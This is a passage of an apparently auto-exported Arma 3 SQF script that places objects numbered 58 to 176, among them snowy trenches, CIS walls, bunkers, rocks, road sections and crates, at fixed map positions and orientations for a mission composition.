_object58 = createVehicle [""land_3AS_cis_wall_Med_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object58 setVectorDirAndUp [[-0.96983,0.243781,0],[0,0,1]];
_object58 setPosASL [4949.39,8565.38,74.8726];


_object59 = createVehicle [""Land_SharpRock_spike"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object59 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object59 setPosASL [4957.83,8632.97,72.8751];


_object60 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object60 setVectorDirAndUp [[-0.0132704,-0.151682,0.98834],[-0.996195,0.0871558,-3.8097e-009]];
_object60 setPosASL [4937.4,8625.3,119.685];


_object61 = createVehicle [""3AS_Rock_12_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object61 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object61 setPosASL [4956.91,8633.94,94.7457];


_object62 = createVehicle [""3AS_Rock_15_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object62 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object62 setPosASL [4955.46,8635.4,88.1662];


_object63 = createVehicle [""3AS_CaveRock_3_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object63 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object63 setPosASL [4949.76,8625.53,72.7858];


_object64 = createVehicle [""land_3AS_fob_light_cis"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object64 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object64 setPosASL [4947.45,8628.85,72.8865];


_object65 = createVehicle [""3as_FlatShield_50x50E"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object65 setVectorDirAndUp [[0.127522,0.991803,0.00799293],[0.0346632,-0.0125104,0.999321]];
_object65 setPosASL [4957.99,8609.46,72.2786];


_object66 = createVehicle [""3AS_Rock_17_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object66 setVectorDirAndUp [[-0.815978,0.578083,0],[0,0,1]];
_object66 setPosASL [4952.68,8639.61,72.9282];


_object67 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object67 setVectorDirAndUp [[0.760325,0.649543,0],[0,0,1]];
_object67 setPosASL [4921.2,8661.53,74.1629];


_object68 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object68 setVectorDirAndUp [[0.0289477,0.236053,0.971309],[0.992564,-0.121721,1.4515e-009]];
_object68 setPosASL [4936.01,8653.3,122.466];


_object69 = createVehicle [""land_3AS_cis_wall_Bunker_v2_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object69 setVectorDirAndUp [[-0.708961,-0.705247,0],[0,0,1]];
_object69 setPosASL [4944.93,8644.97,75.864];


_object70 = createVehicle [""3as_FlatShield_50x50E"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object70 setVectorDirAndUp [[-0.711604,0.702581,0],[0,0,1]];
_object70 setPosASL [4939.86,8654.39,72.93];


_object71 = createVehicle [""3AS_CaveRock_9_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object71 setVectorDirAndUp [[-0.536129,0.844136,0],[0,0,1]];
_object71 setPosASL [4941.41,8665.4,73.338];


_object72 = createVehicle [""land_3as_Imperial_Fuel_Pod"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object72 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object72 setPosASL [4932.2,8692.3,74.8802];


_object73 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object73 setVectorDirAndUp [[-0.827189,-0.561923,0],[0,0,1]];
_object73 setPosASL [4982.14,8551.06,57.9102];


_object74 = createVehicle [""Land_SharpRock_wallV"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object74 setVectorDirAndUp [[-0.827189,-0.561923,0],[0,0,1]];
_object74 setPosASL [4962.8,8550.26,76.7823];


_object75 = createVehicle [""3AS_Rock_12_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object75 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object75 setPosASL [4971.52,8562.66,72.7043];


_object76 = createVehicle [""3AS_Metal_Trench_Corner"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object76 setVectorDirAndUp [[0.0880752,-0.996114,0],[0,0,1]];
_object76 setPosASL [4995.36,8582.73,72.0696];


_object77 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object77 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object77 setPosASL [4996.38,8591.65,72.0696];


_object78 = createVehicle [""3AS_Rock_13_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object78 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object78 setPosASL [4995.46,8565.6,72.8614];


_object79 = createVehicle [""3AS_Metal_Trench_X"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object79 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object79 setPosASL [4993.04,8631.41,72.0892];


_object80 = createVehicle [""3AS_Metal_Trench_X"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object80 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object80 setPosASL [4995.58,8602.08,72.0696];


_object81 = createVehicle [""3AS_Rock_17_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object81 setVectorDirAndUp [[-0.815978,0.578083,0],[0,0,1]];
_object81 setPosASL [4966.61,8630.58,72.3662];


_object82 = createVehicle [""CUP_A2_Road_asf3_25"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object82 setVectorDirAndUp [[0,0.999992,-0.00399675],[0.023991,0.0039956,0.999704]];
_object82 setPosASL [4983.44,8620.02,71.0856];


_object83 = createVehicle [""3AS_Metal_Trench_X"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object83 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object83 setPosASL [4991.5,8654.3,72.6777];


_object84 = createVehicle [""3AS_Rock_12_Ice"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object84 setVectorDirAndUp [[0,1,0],[0,0,1]];
_object84 setPosASL [4961.69,8642.96,73.0516];


_object85 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object85 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object85 setPosASL [4992.24,8641.89,72.0892];


_object86 = createVehicle [""CUP_A2_Road_asf3_25"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object86 setVectorDirAndUp [[0,0.999992,-0.00399675],[0.023991,0.0039956,0.999704]];
_object86 setPosASL [4983.23,8643.99,71.7382];


_object87 = createVehicle [""CUP_A2_Road_asf3_25"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object87 setVectorDirAndUp [[0,0.999992,-0.00399675],[0.023991,0.0039956,0.999704]];
_object87 setPosASL [4982.77,8668.43,72.4085];


_object88 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object88 setVectorDirAndUp [[-0.724034,0.68469,0.0835101],[0.031983,-0.0876152,0.995641]];
_object88 setPosASL [4970.92,8701.59,73.4832];


_object89 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object89 setVectorDirAndUp [[-0.478119,-0.868721,-0.129327],[-0.0339807,-0.128841,0.991083]];
_object89 setPosASL [4968.81,8692.49,73.0997];


_object90 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object90 setVectorDirAndUp [[-0.0247682,0.998431,0.0502188],[0.0119996,-0.0499337,0.99868]];
_object90 setPosASL [4974.51,8686.28,72.6259];


_object91 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object91 setVectorDirAndUp [[-0.688515,-0.724766,0.0257304],[0.0499373,-0.0119847,0.99868]];
_object91 setPosASL [4971.97,8687.26,72.6794];


_object92 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object92 setVectorDirAndUp [[-0.0247682,0.991313,0.129171],[0.0119996,-0.128906,0.991584]];
_object92 setPosASL [4971.79,8691.77,73.0249];


_object93 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object93 setVectorDirAndUp [[-0.999621,-0.0253373,0.0107441],[0.0119996,-0.0499337,0.99868]];
_object93 setPosASL [4970.88,8689.74,72.7876];


_object94 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object94 setVectorDirAndUp [[-0.0247699,0.992572,0.119108],[0,-0.119145,0.992877]];
_object94 setPosASL [4973.4,8702.69,73.5378];


_object95 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object95 setVectorDirAndUp [[0.0246829,-0.999569,0.015921],[0.0837045,0.0179364,0.996329]];
_object95 setPosASL [4969.01,8696.49,73.519];


_object96 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object96 setVectorDirAndUp [[-0.996185,-0.0232589,0.0841111],[0.0837045,0.0179364,0.996329]];
_object96 setPosASL [4969.95,8699.05,73.3941];


_object97 = createVehicle [""3AS_H_barrier_small_3"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object97 setVectorDirAndUp [[0.0247571,-0.999335,-0.0267757],[0.0319849,-0.0259784,0.999151]];
_object97 setPosASL [4973.88,8698.02,73.1951];


_object98 = createVehicle [""3AS_H_barrier_small_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object98 setVectorDirAndUp [[0.999451,0.0261679,-0.0203095],[0.0219955,-0.0658418,0.997588]];
_object98 setPosASL [4975.56,8690.88,72.7978];


_object99 = createVehicle [""3AS_H_barrier_small_1"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object99 setVectorDirAndUp [[0.999182,0.0255962,-0.0313204],[0.0319849,-0.0259784,0.999151]];
_object99 setPosASL [4973.75,8696.46,73.1584];


_object100 = createVehicle [""3AS_Short_Wall_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object100 setVectorDirAndUp [[-0.0247481,0.998589,0.0469764],[0.041963,-0.0459117,0.998064]];
_object100 setPosASL [4977.54,8694.13,72.9339];


_object101 = createVehicle [""3AS_Short_Wall_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object101 setVectorDirAndUp [[0.804496,0.593571,0.0214382],[0.0219955,-0.0658418,0.997588]];
_object101 setPosASL [4976.43,8691.86,72.8421];


_object102 = createVehicle [""3AS_Metal_Trench_X"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object102 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object102 setPosASL [4988.95,8683.64,72.6973];


_object103 = createVehicle [""3AS_Short_Wall_Curved"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object103 setVectorDirAndUp [[0.660985,-0.74891,-0.0472428],[0.041963,-0.0259688,0.998782]];
_object103 setPosASL [4976.66,8696.77,73.0587];


_object104 = createVehicle [""3AS_Metal_Trench_Corner"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object104 setVectorDirAndUp [[0.997001,0.0773904,0],[0,0,1]];
_object104 setPosASL [4985.75,8702.73,73.1815];


_object105 = createVehicle [""CamoNet_BLUFOR_open_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object105 setVectorDirAndUp [[-0.996819,-0.0297045,0.073962],[0.0757809,-0.0656674,0.99496]];
_object105 setPosASL [4974.36,8693.96,73.0275];


_object106 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object106 setVectorDirAndUp [[0.997121,0.075826,0],[0,0,1]];
_object106 setPosASL [4999.35,8684.39,72.6973];


_object107 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object107 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object107 setPosASL [4988.16,8694.11,73.0696];


_object108 = createVehicle [""3AS_Short_Wall_Bunker"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object108 setVectorDirAndUp [[0.999451,0.0261679,-0.0203095],[0.0219955,-0.0658418,0.997588]];
_object108 setPosASL [4976.99,8688.65,72.6202];


_object109 = createVehicle [""3AS_Short_Wall_Bunker"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object109 setVectorDirAndUp [[0.999661,0.02555,-0.00498953],[0.00800059,-0.119141,0.992845]];
_object109 setPosASL [4976.57,8700.39,73.2527];


_object110 = createVehicle [""CUP_A2_Road_asf3_25"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object110 setVectorDirAndUp [[0,0.999992,-0.00399675],[0.023991,0.0039956,0.999704]];
_object110 setPosASL [4982.64,8692.66,72.2974];


_object111 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object111 setVectorDirAndUp [[-0.739978,0.672631,0],[0,0,1]];
_object111 setPosASL [5028.74,8310.07,127.989];


_object112 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object112 setVectorDirAndUp [[-0.739978,0.672631,0],[0,0,1]];
_object112 setPosASL [5020.31,8309.17,127.989];


_object113 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object113 setVectorDirAndUp [[0.672627,0.739982,0],[0,0,1]];
_object113 setPosASL [5022.73,8311.85,127.989];


_object114 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object114 setVectorDirAndUp [[0.739978,-0.672631,0],[0,0,1]];
_object114 setPosASL [5031.13,8304.22,127.989];


_object115 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object115 setVectorDirAndUp [[-0.672631,-0.739978,0],[0,0,1]];
_object115 setPosASL [5028.71,8301.54,127.989];


_object116 = createVehicle [""3AS_Rock_17_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object116 setVectorDirAndUp [[-0.910387,-0.413759,0],[0,0,1]];
_object116 setPosASL [5003.9,8558.81,73.2061];


_object117 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object117 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object117 setPosASL [5017.23,8596.75,72.0696];


_object118 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object118 setVectorDirAndUp [[0.997121,0.075826,0],[0,0,1]];
_object118 setPosASL [5005.92,8602.85,72.0696];


_object119 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object119 setVectorDirAndUp [[0.997121,0.075826,0],[0,0,1]];
_object119 setPosASL [5003.43,8632.17,72.0892];


_object120 = createVehicle [""land_3AS_Bunker_Metal_Command"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object120 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object120 setPosASL [5014.41,8618.19,72.0644];


_object121 = createVehicle [""3AS_Metal_Trench_Short"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object121 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object121 setPosASL [5015.79,8610.62,72.0696];


_object122 = createVehicle [""3AS_Metal_Trench_Short"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object122 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object122 setPosASL [5014.33,8626.07,72.0644];


_object123 = createVehicle [""3AS_Metal_Trench_T"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object123 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object123 setPosASL [5012.17,8632.86,72.0644];


_object124 = createVehicle [""3AS_Metal_Trench_T"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object124 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object124 setPosASL [5014.66,8603.55,72.0696];


_object125 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object125 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object125 setPosASL [5013.71,8639.97,72.0644];


_object126 = createVehicle [""3AS_Metal_Trench_Long"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object126 setVectorDirAndUp [[0.997121,0.075826,0],[0,0,1]];
_object126 setPosASL [5001.84,8655.08,72.6777];


_object127 = createVehicle [""land_3AS_Bunker_Metal_Command"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object127 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object127 setPosASL [5010.33,8670.42,72.6725];


_object128 = createVehicle [""3AS_Metal_Trench_Short"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object128 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object128 setPosASL [5011.71,8662.84,72.6777];


_object129 = createVehicle [""3AS_Metal_Trench_Short"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object129 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object129 setPosASL [5010.25,8678.29,72.6725];


_object130 = createVehicle [""3AS_Metal_Trench_T"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object130 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object130 setPosASL [5010.57,8655.77,72.6777];


_object131 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object131 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object131 setPosASL [5013.14,8648.98,72.6777];


_object132 = createVehicle [""3AS_Metal_Trench_T"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object132 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object132 setPosASL [5008.08,8685.08,72.6725];


_object133 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object133 setVectorDirAndUp [[-0.0766757,0.997056,0],[0,0,1]];
_object133 setPosASL [5009.63,8692.19,72.6725];


_object134 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object134 setVectorDirAndUp [[0.773881,0.633331,0],[0,0,1]];
_object134 setPosASL [5029.78,9148.37,139.02];


_object135 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object135 setVectorDirAndUp [[0.773881,0.633331,0],[0,0,1]];
_object135 setPosASL [5030.13,9156.85,139.02];


_object136 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object136 setVectorDirAndUp [[0.633335,-0.773878,0],[0,0,1]];
_object136 setPosASL [5032.42,9154.06,139.02];


_object137 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object137 setVectorDirAndUp [[-0.773881,-0.63333,0],[0,0,1]];
_object137 setPosASL [5023.64,9146.87,139.02];


_object138 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object138 setVectorDirAndUp [[-0.633331,0.773881,0],[0,0,1]];
_object138 setPosASL [5021.34,9149.66,139.02];


_object139 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object139 setVectorDirAndUp [[-0.571221,-0.820796,0],[0,0,1]];
_object139 setPosASL [5518.51,8321.39,131.598];


_object140 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object140 setVectorDirAndUp [[-0.820796,0.571221,0],[0,0,1]];
_object140 setPosASL [5515.54,8323.45,131.598];


_object141 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object141 setVectorDirAndUp [[0.571221,0.820796,0],[0,0,1]];
_object141 setPosASL [5524,8324.52,131.598];


_object142 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object142 setVectorDirAndUp [[0.820799,-0.571217,0],[0,0,1]];
_object142 setPosASL [5524.99,8330.71,131.598];


_object143 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object143 setVectorDirAndUp [[0.571221,0.820796,0],[0,0,1]];
_object143 setPosASL [5522.02,8332.76,131.598];


_object144 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object144 setVectorDirAndUp [[0.874249,0.485478,0],[0,0,1]];
_object144 setPosASL [5614.64,8103.71,101.972];


_object145 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object145 setVectorDirAndUp [[0.874249,0.485478,0],[0,0,1]];
_object145 setPosASL [5616.49,8111.99,101.972];


_object146 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object146 setVectorDirAndUp [[0.485483,-0.874246,0],[0,0,1]];
_object146 setPosASL [5618.25,8108.83,101.972];


_object147 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object147 setVectorDirAndUp [[-0.874249,-0.485478,0],[0,0,1]];
_object147 setPosASL [5608.33,8103.32,101.972];


_object148 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object148 setVectorDirAndUp [[-0.485478,0.874249,0],[0,0,1]];
_object148 setPosASL [5606.57,8106.48,101.972];


_object149 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object149 setVectorDirAndUp [[0.554175,0.8324,0],[0,0,1]];
_object149 setPosASL [5616.07,8773.28,153.741];


_object150 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object150 setVectorDirAndUp [[0.554175,0.8324,0],[0,0,1]];
_object150 setPosASL [5613.91,8781.48,153.741];


_object151 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object151 setVectorDirAndUp [[0.832403,-0.554171,0],[0,0,1]];
_object151 setPosASL [5616.92,8779.48,153.741];


_object152 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object152 setVectorDirAndUp [[-0.554175,-0.8324,0],[0,0,1]];
_object152 setPosASL [5610.64,8770.03,153.741];


_object153 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object153 setVectorDirAndUp [[-0.8324,0.554175,0],[0,0,1]];
_object153 setPosASL [5607.62,8772.03,153.741];


_object154 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object154 setVectorDirAndUp [[-0.686986,0.726671,0],[0,0,1]];
_object154 setPosASL [5678.48,9237.77,155.794];


_object155 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object155 setVectorDirAndUp [[0.726671,0.686986,0],[0,0,1]];
_object155 setPosASL [5686.98,9237.09,155.794];


_object156 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object156 setVectorDirAndUp [[-0.726671,-0.686985,0],[0,0,1]];
_object156 setPosASL [5680.96,9235.14,155.794];


_object157 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object157 setVectorDirAndUp [[0.686989,-0.726667,0],[0,0,1]];
_object157 setPosASL [5689.21,9242.94,155.794];


_object158 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object158 setVectorDirAndUp [[0.726671,0.686986,0],[0,0,1]];
_object158 setPosASL [5686.72,9245.57,155.794];


_object159 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object159 setVectorDirAndUp [[-0.368534,0.929614,0],[0,0,1]];
_object159 setPosASL [5757.43,9278.54,136.348];


_object160 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object160 setVectorDirAndUp [[0.929614,0.368534,0],[0,0,1]];
_object160 setPosASL [5745.38,9275.05,136.399];


_object161 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object161 setVectorDirAndUp [[-0.929288,-0.369142,-0.0125309],[0.0234571,-0.0928416,0.995405]];
_object161 setPosASL [5751.44,9276,136.145];


_object162 = createVehicle [""land_3AS_CIS_Wall_Door_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object162 setVectorDirAndUp [[0.368533,-0.929615,0],[0,0,1]];
_object162 setPosASL [5745.59,9307.47,136.312];


_object163 = createVehicle [""Land_Bunker_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object163 setVectorDirAndUp [[-0.929616,-0.368531,0],[0,0,1]];
_object163 setPosASL [5753.5,9291.11,136.359];


_object164 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object164 setVectorDirAndUp [[0.368518,-0.929587,-0.00788408],[0.00412875,-0.00684423,0.999968]];
_object164 setPosASL [5754.15,9303.22,136.379];


_object165 = createVehicle [""3as_small_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object165 setVectorDirAndUp [[-0.368557,0.9296,0.00296285],[-0.0154092,-0.00929596,0.999838]];
_object165 setPosASL [5741.47,9298.94,136.234];


_object166 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object166 setVectorDirAndUp [[0.929614,0.368534,0],[0,0,1]];
_object166 setPosASL [5739.81,9286.29,136.375];


_object167 = createVehicle [""3as_planetaryshield_501w"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object167 setVectorDirAndUp [[0.93569,0.352823,2.8289e-008],[-0.352823,0.93569,-4.09003e-008]];
_object167 setPosASL [5752.12,9291.33,129.406];


_object168 = createVehicle [""land_3AS_CIS_Ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object168 setVectorDirAndUp [[0.368534,-0.929614,0],[0,0,1]];
_object168 setPosASL [5743.66,9293.37,136.229];


_object169 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object169 setVectorDirAndUp [[0.368533,-0.929615,0],[0,0,1]];
_object169 setPosASL [5736.26,9298.31,136.309];


_object170 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object170 setVectorDirAndUp [[-0.929616,-0.368531,0],[0,0,1]];
_object170 setPosASL [5759.62,9307.42,136.367];


_object171 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object171 setVectorDirAndUp [[-0.371089,0.927794,0.0386106],[-0.0771894,-0.0722555,0.994395]];
_object171 setPosASL [5742.15,9280.02,135.932];


_object172 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object172 setVectorDirAndUp [[-0.36859,0.929581,0.00460828],[-0.0239657,-0.0144581,0.999608]];
_object172 setPosASL [5737.26,9292.27,136.068];


_object173 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object173 setVectorDirAndUp [[-0.929616,-0.368531,0],[0,0,1]];
_object173 setPosASL [5765.2,9296.15,136.367];


_object174 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object174 setVectorDirAndUp [[-0.368534,0.929614,0],[0,0,1]];
_object174 setPosASL [5768.68,9284.11,136.367];


_object175 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object175 setVectorDirAndUp [[0.368534,-0.929614,0],[0,0,1]];
_object175 setPosASL [5767.75,9290.17,136.367];


_object176 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object176 setVectorDirAndUp [[0.368534,-0.929614,0],[0,0,1]];
_object176 setPosASL [5762.89,9302.43,136.367];


